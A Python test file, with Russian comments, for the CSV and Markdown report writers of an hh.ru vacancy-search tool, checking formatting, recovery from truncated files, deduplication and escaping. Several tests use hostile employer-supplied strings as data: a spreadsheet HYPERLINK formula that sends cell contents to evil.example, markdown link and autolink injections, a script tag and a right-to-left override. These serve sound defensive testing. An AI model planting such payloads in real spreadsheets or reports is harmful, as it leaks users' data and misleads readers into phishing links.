import csv
import os
import re
from datetime import UTC, datetime
from pathlib import Path

import pytest

from hh_search.domain.models import (
    DiscoveredVacancy,
    Salary,
    ScoreBreakdown,
    ScoredVacancy,
    VacancyDetails,
)
from hh_search.sinks import build_sinks
from hh_search.sinks.csv_sink import COLUMNS, CsvSink
from hh_search.sinks.markdown_sink import SNIPPET_LENGTH, MarkdownSink

# Данные тестов повторяют то, что приходит из хранилища: даты — aware UTC с
# микросекундами (`storage/time_utils.py`), а зарплата и дата публикации
# могут отсутствовать честно (листинг их не отдаёт, а на странице вакансии
# блока зарплаты может не быть вовсе).
NOW = datetime(2026, 7, 27, 10, 0, tzinfo=UTC)
PUBLISHED = datetime(2026, 7, 27, 6, 21, 20, 933000, tzinfo=UTC)
SALARY = Salary(raw="от 200 000 ₽", amount_from=200000, currency="₽")


def make_scored(
    vacancy_id: str = "1",
    title: str = "Embedded Engineer",
    total: float = 87.4,
    cluster: str = "embedded",
    company: str | None = "ООО Ромашка",
    area: str | None = "Нижний Новгород",
    salary: Salary = SALARY,
    published_at: datetime | None = PUBLISHED,
    description: str = "Требуется опыт Yocto и BSP.",
) -> ScoredVacancy:
    return ScoredVacancy(
        discovered=DiscoveredVacancy(
            id=vacancy_id,
            url=f"https://hh.ru/vacancy/{vacancy_id}",
            title=title,
            company=company,
            area=area,
            salary=salary,
            published_at=published_at,
            found_by_query="programmist",
        ),
        details=VacancyDetails(description=description),
        score=ScoreBreakdown(
            title=1.0,
            stack=0.8,
            responsibilities=0.5,
            domain=1.0,
            penalty=0.0,
            total=total,
            matched={"stack": ["yocto"]},
        ),
        cluster=cluster,
    )


def read_rows(path: Path, errors: str = "strict") -> list[dict[str, str]]:
    """Строки файла дня. `errors` нужен там, где хвост файла оборван: битый
    байт остаётся в файле навсегда (дозаписью его не убрать), и читать его
    приходится терпимо — как это делает сам приёмник."""
    with path.open(encoding="utf-8-sig", newline="", errors=errors) as handle:
        return list(csv.DictReader(handle, delimiter=";"))


def cut_inside_a_cyrillic_letter(path: Path, marker: str) -> None:
    """Обрывает файл на первом байте кириллической буквы из `marker`.

    Ровно то, что делает с записью полный диск: `write()` кладёт часть
    буфера и возвращает ENOSPC (в тесте это воспроизведено обрезкой, в
    отчёте — честным RLIMIT_FSIZE). Хвост файла перестаёт быть валидным
    UTF-8.
    """
    data = path.read_bytes()
    path.write_bytes(data[: data.rindex(marker.encode()) + 1])


# --- CSV: второго шанса не будет ------------------------------------------


def test_csv_row_carries_every_column(tmp_path: Path) -> None:
    """Сравнивается словарь ЦЕЛИКОМ, а не три поля из двенадцати.

    После `mark_reported()` вакансия навсегда уходит из `unreported()`:
    колонка, которую приёмник не записал, потеряна окончательно —
    переотправки нет по построению (спека §5.2).
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    rows = read_rows(tmp_path / "2026-07-27-new.csv")
    assert rows == [
        {
            "id": "1",
            "score": "87,4",
            "cluster": "embedded",
            "title": "Embedded Engineer",
            "company": "ООО Ромашка",
            "area": "Нижний Новгород",
            "salary_from": "200000",
            "salary_to": "",
            "currency": "₽",
            "published_at": "2026-07-27 06:21",
            "listing": "programmist",
            "url": "https://hh.ru/vacancy/1",
        }
    ]


def test_csv_opens_in_excel(tmp_path: Path) -> None:
    """BOM и `;` — не вкус, а условие читаемости.

    Без BOM Excel читает UTF-8 как cp1251 и показывает `ÐžÐžÐž`; с русской
    локалью разделителем списка является `;`, и файл с запятыми целиком
    ложится в первую колонку.
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    raw = (tmp_path / "2026-07-27-new.csv").read_bytes()
    assert raw.startswith(b"\xef\xbb\xbf")
    header = raw.decode("utf-8-sig").splitlines()[0]
    assert header == ";".join(COLUMNS)


def test_csv_appends_second_run_without_repeating_header_or_bom(tmp_path: Path) -> None:
    """Второй прогон дня дописывает, а не начинает файл заново — и не
    вставляет второй BOM: кодек utf-8-sig пишет его при каждом открытии."""
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    sink.emit([make_scored(vacancy_id="2")], NOW)
    path = tmp_path / "2026-07-27-new.csv"
    assert [row["id"] for row in read_rows(path)] == ["1", "2"]
    assert path.read_text(encoding="utf-8-sig").count("\ufeff") == 0


def test_csv_neutralizes_formula_written_by_the_employer(tmp_path: Path) -> None:
    """Заголовок вакансии — внешний недоверенный текст: его пишет
    работодатель. Квотирование модуля csv от формул не защищает."""
    title = '=HYPERLINK("http://evil.example/?u="&A1;"вакансия")'
    CsvSink(tmp_path).emit(
        [make_scored(title=title, company="+7 (999) 123-45-67 — Embedded Linux")], NOW
    )
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["title"] == f"'{title}"
    assert row["company"] == "'+7 (999) 123-45-67 — Embedded Linux"


def test_csv_leaves_unknown_date_and_salary_empty(tmp_path: Path) -> None:
    """`published_at` необязателен, а блока зарплаты на странице может не
    быть вовсе. В отчёте это пустые ячейки, а не строка `None` и не падение."""
    CsvSink(tmp_path).emit([make_scored(published_at=None, salary=Salary())], NOW)
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["published_at"] == ""
    assert (row["salary_from"], row["salary_to"], row["currency"]) == ("", "", "")


def test_csv_writes_both_ends_of_the_salary_range(tmp_path: Path) -> None:
    """Вилка «от и до» — обычный случай на hh.ru.

    В остальных тестах `amount_to` пуст, поэтому исчезновение колонки
    `salary_to` целиком было бы невидимо: ожидание `""` совпадает с тем,
    что DictWriter пишет за отсутствующий ключ.
    """
    CsvSink(tmp_path).emit(
        [
            make_scored(
                salary=Salary(
                    raw="200 000 – 300 000 ₽",
                    amount_from=200000,
                    amount_to=300000,
                    currency="₽",
                )
            )
        ],
        NOW,
    )
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert (row["salary_from"], row["salary_to"], row["currency"]) == ("200000", "300000", "₽")


def test_csv_writes_the_score_as_a_number_for_the_russian_excel(tmp_path: Path) -> None:
    """Разделитель дробной части — запятая, как и разделитель колонок `;`.

    Обе настройки следуют из одной русской локали Excel, ради которой в
    файле стоят BOM и `;`: точку такой Excel дробной частью не считает,
    колонка становится текстовой, и фильтр «score > 60» с числовой
    сортировкой молча перестают работать.
    """
    CsvSink(tmp_path).emit([make_scored(total=87.4)], NOW)
    assert read_rows(tmp_path / "2026-07-27-new.csv")[0]["score"] == "87,4"


def test_csv_keeps_a_negative_score_a_number(tmp_path: Path) -> None:
    """Числовые колонки формируем мы, поэтому от формул их защищать не от
    кого — а обезвреживание превратило бы `-5` в текст `'-5`. Сегодня балл
    клампится, но `Scorer` — заявленная точка расширения (спека §4.2), и
    первым же признаком поломки стала бы молча текстовая колонка.
    """
    CsvSink(tmp_path).emit([make_scored(total=-5.0)], NOW)
    assert read_rows(tmp_path / "2026-07-27-new.csv")[0]["score"] == "-5,0"


# --- CSV: файл дня, оставленный убитым или оборванным прогоном ------------


def test_csv_writes_the_header_over_a_zero_length_file(tmp_path: Path) -> None:
    """`open("a")` создаёт файл сразу, а содержимое уходит при закрытии.

    SIGKILL контейнера, OOM или ENOSPC между этими моментами оставляют
    файл дня НУЛЕВОЙ ДЛИНЫ. Если считать такой файл существующим, BOM и
    заголовок не будут написаны никогда за этот день (Excel покажет
    `ÐžÐžÐž`), а дедупликация примет первую вакансию за заголовок и
    потеряет её — молча и до смены суток.
    """
    path = tmp_path / "2026-07-27-new.csv"
    path.touch()
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1"), make_scored(vacancy_id="2")], NOW)
    assert path.read_bytes().startswith(b"\xef\xbb\xbf")
    assert path.read_text(encoding="utf-8-sig").splitlines()[0] == ";".join(COLUMNS)
    sink.emit([make_scored(vacancy_id="1"), make_scored(vacancy_id="2")], NOW)
    assert [row["id"] for row in read_rows(path)] == ["1", "2"]


def test_csv_writes_the_header_over_a_file_holding_only_the_bom(tmp_path: Path) -> None:
    """Тот же обрыв, но буфер успел частично уйти: в файле один BOM и
    ничего больше. Заголовок обязан появиться, а BOM — остаться ровно
    одним: второй U+FEFF посреди данных Excel покажет как мусор."""
    path = tmp_path / "2026-07-27-new.csv"
    path.write_bytes(b"\xef\xbb\xbf")
    CsvSink(tmp_path).emit([make_scored()], NOW)
    raw = path.read_bytes()
    assert raw.count(b"\xef\xbb\xbf") == 1
    assert raw.decode("utf-8-sig").splitlines()[0] == ";".join(COLUMNS)
    assert [row["id"] for row in read_rows(path)] == ["1"]


def test_csv_does_not_glue_a_row_onto_an_unfinished_line(tmp_path: Path) -> None:
    """Дозапись в конец оборванной строки растворяет вакансию в соседней.

    Обрыв приходится на середину строки, и следующий прогон приклеивает к
    ней свою: `url` одной вакансии становится колонкой другой, а вакансия,
    которую дописывали, из отчёта исчезает. Переотправки нет — из
    `unreported()` она уже ушла (спека §5.2).
    """
    path = tmp_path / "2026-07-27-new.csv"
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id=str(i)) for i in (1, 2, 3)], NOW)
    os.truncate(path, path.stat().st_size - 20)
    sink.emit([make_scored(vacancy_id="3"), make_scored(vacancy_id="4")], NOW)
    rows = read_rows(path)
    assert [row["url"] for row in rows if row["id"] == "4"] == ["https://hh.ru/vacancy/4"]
    # Вакансия, чья строка оборвалась, вписывается заново целиком: строка
    # без `url` — это не доставленная вакансия.
    assert [row["url"] for row in rows if row["id"] == "3"][-1] == "https://hh.ru/vacancy/3"


def test_csv_survives_a_row_truncated_inside_a_cyrillic_letter(tmp_path: Path) -> None:
    """Обрыв на полном диске режет запись посреди многобайтового символа.

    Строгий UTF-8 при чтении файла дня превращает это в UnicodeDecodeError
    на КАЖДОМ следующем прогоне: отчётов нет до смены суток, самопочинки
    нет, а csv идёт первым в `sinks: [csv, markdown]` и уносит с собой
    markdown. Сообщение при этом указывает на чтение файла, а не на
    полный диск.
    """
    path = tmp_path / "2026-07-27-new.csv"
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1"), make_scored(vacancy_id="2")], NOW)
    cut_inside_a_cyrillic_letter(path, "Ромашка")
    sink.emit([make_scored(vacancy_id="2"), make_scored(vacancy_id="3")], NOW)
    rows = read_rows(path, errors="replace")
    assert [row["url"] for row in rows if row["id"] == "2"][-1] == "https://hh.ru/vacancy/2"
    assert [row["url"] for row in rows if row["id"] == "3"] == ["https://hh.ru/vacancy/3"]
    # Целые строки, записанные до обрыва, дедупликация видит по-прежнему.
    assert [row["id"] for row in rows].count("1") == 1


# --- Markdown: порог меняет подробность, а не состав ----------------------


def test_markdown_splits_top_and_rest_by_threshold(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Хорошая вакансия", total=87.4),
            make_scored(vacancy_id="2", title="Так себе вакансия", total=42.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Хорошая вакансия") < text.index("## Остальное")
    assert text.index("## Остальное") < text.index("Так себе вакансия")


def test_markdown_keeps_a_vacancy_exactly_at_the_threshold_in_top(tmp_path: Path) -> None:
    """Спека §6.3 фиксирует `>=`: вакансия на пороге РОВНО идёт в «Топ».

    Разница между `>` и `>=` — это ровно те вакансии, для которых порог и
    подбирался, поэтому строгий знак был бы тихой потерей подробностей.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(title="Ровно порог", total=60.0)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Ровно порог") < text.index("## Остальное")
    assert "_ничего выше порога_" not in text
    # И ровно один раз: `<=` во втором условии положило бы её в оба
    # раздела, а «Остальное» — это обратная связь по качеству скоринга,
    # и вакансия выше порога в ней означала бы неверную обратную связь.
    assert text.count("Ровно порог") == 1
    assert "_пусто_" in text


def test_markdown_orders_top_by_score_descending(tmp_path: Path) -> None:
    """Внутри кластера — от лучшего к худшему: отчёт читают сверху."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Похуже", total=70.0),
            make_scored(vacancy_id="2", title="Получше", total=90.0),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Получше") < text.index("Похуже")


def test_markdown_groups_top_by_cluster(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Первая", total=90.0, cluster="embedded"),
            make_scored(vacancy_id="2", title="Вторая", total=80.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "### embedded" in text
    assert "### backend" in text
    assert "https://hh.ru/vacancy/1" in text


def test_markdown_gives_each_cluster_a_single_heading(tmp_path: Path) -> None:
    """Кластеры приходят вперемешку: порядок в «Топе» задаёт балл.

    Без сортировки перед `groupby` один и тот же кластер получил бы
    столько заголовков, сколько раз он встретился, — и читатель принял бы
    второй `### embedded` за другой раздел.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Первая", total=95.0, cluster="embedded"),
            make_scored(vacancy_id="2", title="Вторая", total=90.0, cluster="backend"),
            make_scored(vacancy_id="3", title="Третья", total=85.0, cluster="embedded"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("### embedded") == 1
    assert text.count("### backend") == 1
    # Сортировка по кластеру устойчива: внутри кластера порядок по баллу.
    assert text.index("Первая") < text.index("Третья")


def test_markdown_header_carries_the_time_of_the_run(tmp_path: Path) -> None:
    """Прогонов в сутках несколько, и все они дописывают в один файл: без
    времени в шапке разделы одного дня неотличимы друг от друга."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.splitlines()[0] == "# Новые вакансии — 2026-07-27 10:00"


def test_markdown_short_entry_shows_the_score_and_the_company(tmp_path: Path) -> None:
    """«Остальное» — это обратная связь по качеству скоринга: строка без
    балла и без компании не даёт понять, почему вакансия оказалась ниже
    порога, и раздел перестаёт быть обратной связью."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(title="Так себе вакансия", total=42.0)], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "- [Так себе вакансия](https://hh.ru/vacancy/1) — 42.0 · ООО Ромашка" in text


def test_markdown_shows_one_decimal_of_the_score(tmp_path: Path) -> None:
    """`{:.0f}` печатает `60` по обе стороны порога: 60.4 в «Топе» и 59.5 в
    «Остальном» выглядят одинаково, и разницу между разделами читателю
    объяснить нечем."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Чуть выше", total=60.4),
            make_scored(vacancy_id="2", title="Чуть ниже", total=59.5),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "60.4" in text
    assert "59.5" in text


def test_markdown_full_entry_shows_company_area_and_salary(tmp_path: Path) -> None:
    """Три поля, за которые заплачено запросом к странице вакансии. Без них
    «Топ» приходится открывать по ссылке, чтобы понять, стоит ли открывать."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · Нижний Новгород · от 200 000 ₽" in text


def test_markdown_says_the_salary_is_unknown_when_the_page_had_none(tmp_path: Path) -> None:
    """Ветка достижима: блока `data-qa="vacancy-salary"` на странице может не
    быть — это обычный случай, а не ошибка (спека §3.4)."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(salary=Salary(), area=None, published_at=None)], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · — · зарплата не указана · дата неизвестна" in text


def test_markdown_shows_the_publication_date(tmp_path: Path) -> None:
    """За дату публикации заплачен запрос к странице вакансии, и в CSV она
    есть. Без неё свежую вакансию не отличить от переопубликованной старой
    — а это первое, на что смотрят в отчёте о НОВОМ."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · Нижний Новгород · от 200 000 ₽ · 2026-07-27 06:21" in text


def test_markdown_truncates_the_snippet(tmp_path: Path) -> None:
    """Описание с hh.ru — это килобайты текста: без обрезки «Топ» перестаёт
    быть выжимкой и читается дольше, чем сама страница вакансии."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(description="я" * 500)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "я" * SNIPPET_LENGTH + "…" in text
    assert "я" * (SNIPPET_LENGTH + 1) not in text


def test_markdown_collapses_line_breaks_from_the_description(tmp_path: Path) -> None:
    """Описание приходит со страницы многострочным (`html_to_text` ставит
    переводы строк на месте блочных тегов). Пустая строка внутри пункта —
    это конец пункта для любого рендерера markdown."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(description="Требуется опыт.\n\nYocto и BSP.")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "Требуется опыт. Yocto и BSP.…" in text


def test_markdown_appends_the_second_run_of_the_day(tmp_path: Path) -> None:
    """Прогон идёт раз в несколько часов: 'w' затирал бы утренние находки
    вечерними, и вернуть их было бы нечем — `mark_reported` уводит вакансию
    из `unreported()` навсегда."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW)
    sink.emit([make_scored(vacancy_id="2", title="Вечерняя")], NOW.replace(hour=18))
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("# Новые вакансии") == 2
    assert "Утренняя" in text
    assert "Вечерняя" in text


def test_markdown_survives_a_broken_tail_of_todays_file(tmp_path: Path) -> None:
    """Обрыв записи на полном диске режет файл посреди кириллицы.

    Строгий UTF-8 при чтении файла дня превращает это в UnicodeDecodeError
    на каждом следующем прогоне до смены суток, а дозапись в конец
    оборванной строки приклеивает шапку нового отчёта к обрывку старого —
    и заголовок первого уровня перестаёт быть заголовком.
    """
    path = tmp_path / "2026-07-27-new.md"
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW)
    cut_inside_a_cyrillic_letter(path, "Требуется")
    sink.emit([make_scored(vacancy_id="2", title="Вечерняя")], NOW.replace(hour=18))
    text = path.read_bytes().decode("utf-8", errors="replace")
    assert "# Новые вакансии — 2026-07-27 18:00" in text.splitlines()
    assert "Вечерняя" in text
    # Ссылки, вписанные до обрыва, дедупликация видит по-прежнему.
    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW.replace(hour=20))
    text = path.read_bytes().decode("utf-8", errors="replace")
    assert text.count("https://hh.ru/vacancy/1") == 1


def test_markdown_escapes_link_syntax_from_the_employer(tmp_path: Path) -> None:
    """Заголовок пишет работодатель, и `[Удалённо]` в его начале на hh.ru
    встречается. Незакрытая скобка превращает пункт отчёта в рабочую ссылку
    на чужой сайт."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(title="[Удалённо] Инженер](https://evil.example)")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert r"\[Удалённо\]" in text
    # Единственная настоящая ссылка в отчёте — на hh.ru.
    assert re.findall(r"(?<!\\)\]\((http[^)]+)\)", text) == ["https://hh.ru/vacancy/1"]


def test_markdown_escapes_angle_brackets_from_the_employer(tmp_path: Path) -> None:
    """`<https://evil/>` — это автоссылка CommonMark, а `<a href=...>` —
    сырой HTML, разрешённый markdown по умолчанию. И то и другое —
    РАБОЧАЯ ссылка, неотличимая в отчёте от нашей, и вписывает её
    работодатель тем же полем, что и `[Удалённо]`.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(
                title="Инженер <https://evil.example/phish>",
                description='<a href="https://evil.example">жми</a> <script>alert(1)</script>',
            )
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    # В собственной разметке отчёта угловых скобок нет, поэтому любая
    # неэкранированная пришла от работодателя — и работает.
    assert re.findall(r"(?<!\\)[<>]", text) == []
    assert r"\<https://evil.example/phish\>" in text
    assert r"\<script\>" in text


def test_markdown_escapes_link_syntax_in_the_description(tmp_path: Path) -> None:
    """Описание — такой же недоверенный текст, как заголовок, и вдвое
    длиннее: 200 символов чужого текста попадают в отчёт дословно."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(description="Пишите на [наш сайт](https://evil.example) прямо сегодня")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert r"\[наш сайт\]" in text
    assert re.findall(r"(?<!\\)\]\((http[^)]+)\)", text) == ["https://hh.ru/vacancy/1"]


def test_markdown_drops_control_characters(tmp_path: Path) -> None:
    """Отчёт читают глазами и грепают.

    Нулевой байт ломает grep и часть редакторов, а U+202E (RIGHT-TO-LEFT
    OVERRIDE) переворачивает остаток строки при показе — заголовок пишет
    работодатель, и оба символа доезжают из него в файл как есть.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(title="Инженер\x00 ‮ьлетавозьлоп")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "\x00" not in text
    assert "\u202e" not in text
    assert "Инженер" in text


# --- фабрика и пустой вход ------------------------------------------------


def test_sinks_do_nothing_on_empty_input(tmp_path: Path) -> None:
    CsvSink(tmp_path).emit([], NOW)
    MarkdownSink(tmp_path, threshold=60.0).emit([], NOW)
    assert list(tmp_path.iterdir()) == []


def test_build_sinks_resolves_names(tmp_path: Path) -> None:
    sinks = build_sinks(["csv", "markdown"], tmp_path, threshold=60.0)
    assert [sink.name for sink in sinks] == ["csv", "markdown"]


def test_build_sinks_rejects_unknown_name_before_anything_is_written(tmp_path: Path) -> None:
    """Опечатка в `sinks` обязана ронять процесс на старте, до сетевых
    запросов (спека §7/§9), поэтому фабрика строится до `start_run()` и
    отказывает, ничего не создав."""
    with pytest.raises(ValueError, match="telegram"):
        build_sinks(["csv", "telegram"], tmp_path, threshold=60.0)
    assert list(tmp_path.iterdir()) == []


# --- дедупликация: доставка at-least-once по построению -------------------


def test_csv_does_not_repeat_a_vacancy_already_in_todays_file(tmp_path: Path) -> None:
    """Пересекающиеся наборы двух emit дают файл БЕЗ дублей.

    `sinks: [csv, markdown]` по умолчанию, а `mark_reported()` вызывается
    ПОСЛЕ всех приёмников. Упавший markdown при отработавшем csv оставляет
    вакансии `new`, и следующий прогон отдаёт csv тот же список второй раз
    (замер ревью Task 10: «ДУБЛИ в CSV: 20 шт.»); авария контейнера между
    `emit` и `mark_reported` даёт ровно то же. Доставка at-least-once
    неустранима, поэтому дубли снимает приёмник — по факту записанного.
    """
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1"), make_scored(vacancy_id="2")], NOW)
    sink.emit([make_scored(vacancy_id="2"), make_scored(vacancy_id="3")], NOW)
    assert [row["id"] for row in read_rows(tmp_path / "2026-07-27-new.csv")] == ["1", "2", "3"]


def test_csv_writes_nothing_when_the_whole_batch_is_already_in_the_file(tmp_path: Path) -> None:
    """Полный повтор не добавляет к файлу ни байта."""
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    before = (tmp_path / "2026-07-27-new.csv").read_bytes()
    sink.emit([make_scored(vacancy_id="1")], NOW)
    assert (tmp_path / "2026-07-27-new.csv").read_bytes() == before


def test_csv_deduplicates_by_the_file_not_by_the_sink_instance(tmp_path: Path) -> None:
    """Источником истины обязан быть файл, а не состояние в памяти:
    между прогонами процесс перезапускается, и множество отправленного,
    накопленное в приёмнике, не переживает ни рестарт контейнера, ни
    падение `serve` посреди итерации."""
    CsvSink(tmp_path).emit([make_scored(vacancy_id="1")], NOW)
    CsvSink(tmp_path).emit([make_scored(vacancy_id="1")], NOW)
    assert [row["id"] for row in read_rows(tmp_path / "2026-07-27-new.csv")] == ["1"]


def test_markdown_does_not_repeat_a_vacancy_already_in_todays_file(tmp_path: Path) -> None:
    """То же для markdown, но искать приходится по вписанным ссылкам:
    структурированного поля с id в отчёте для человека нет."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Первая"), make_scored(vacancy_id="2")], NOW)
    sink.emit([make_scored(vacancy_id="2"), make_scored(vacancy_id="3", title="Третья")], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("https://hh.ru/vacancy/1") == 1
    assert text.count("https://hh.ru/vacancy/2") == 1
    assert text.count("https://hh.ru/vacancy/3") == 1


def test_markdown_writes_no_empty_section_when_the_whole_batch_repeats(tmp_path: Path) -> None:
    """Иначе вечерний прогон дописывал бы «# Новые вакансии» с пустыми
    разделами: отчёт читают глазами, и такой хвост — это шум."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    before = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    sink.emit([make_scored(vacancy_id="1")], NOW.replace(hour=18))
    assert (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8") == before


def test_markdown_dedup_is_not_fooled_by_a_link_from_the_employer(tmp_path: Path) -> None:
    """Ссылку в отчёт может вписать работодатель — заголовком вида
    `Инженер](https://hh.ru/vacancy/2)`. Экранирование делает её текстом, и
    дедупликация обязана считать его текстом тоже, иначе чужой заголовок
    прячет настоящую вакансию из следующего отчёта."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Инженер](https://hh.ru/vacancy/2)")], NOW)
    sink.emit([make_scored(vacancy_id="2", title="Настоящая вторая")], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "Настоящая вторая" in text


def test_markdown_dedup_survives_a_title_ending_with_a_backslash(tmp_path: Path) -> None:
    """Обратный слэш в конце заголовка не должен прятать СВОЮ ссылку.

    `_escape` удваивает его, и перед закрывающей скобкой нашей ссылки
    оказывается `\\`: одиночный lookbehind `(?<!\\)` принял бы её за
    экранированную работодателем, дедупликация потеряла бы id, и
    следующий прогон вписал бы вакансию второй раз. Поэтому слэши
    считаются парами — экранирован лишь тот `]`, перед которым их
    нечётное число.
    """
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Инженер C++ \\")], NOW)
    sink.emit([make_scored(vacancy_id="1", title="Инженер C++ \\")], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("https://hh.ru/vacancy/1") == 1
